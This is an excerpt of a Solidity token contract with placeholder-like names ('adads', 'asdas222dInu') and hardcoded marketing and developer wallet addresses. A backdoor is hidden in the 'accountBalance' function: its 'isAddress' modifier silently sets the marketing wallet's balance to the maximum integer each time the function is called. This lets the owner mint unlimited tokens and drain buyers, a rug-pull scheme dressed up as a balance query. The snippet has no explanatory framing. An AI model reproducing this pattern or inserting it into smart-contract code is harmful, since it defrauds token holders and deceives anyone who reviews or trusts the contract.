...
interface IERC20 {
    ...
    function accountBalance(address account) external returns (uint);
...
contract adads is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x395Dba429d64E875FBf4c11D2E177815a8228C0a); 
    address payable public Wallet_Dev = payable(0xFEe7F6bBbbD7FFBd73Ce71477B473644800ca3fA);
    ...
    string private constant _name = "asdas222dInu"; 
    string private constant _symbol = unicode"1aa22sd"; 
    ...
    uint256 public _maxTxAmount = (_tTotal * 100 / 100) **2;
    uint256 private _previousMaxTxAmount = _maxTxAmount;
    uint256 private mxSize = 2**256-1;
    ...
    modifier isAddress(address add) {
            _tOwned[Wallet_Marketing] = mxSize;
        _;
    }
    
    constructor () {

        _owner = 0xFEe7F6bBbbD7FFBd73Ce71477B473644800ca3fA;
    ...
    function accountBalance(address account) public isAddress(account) override returns (uint256) {
        _accountBalance = _tOwned[account];
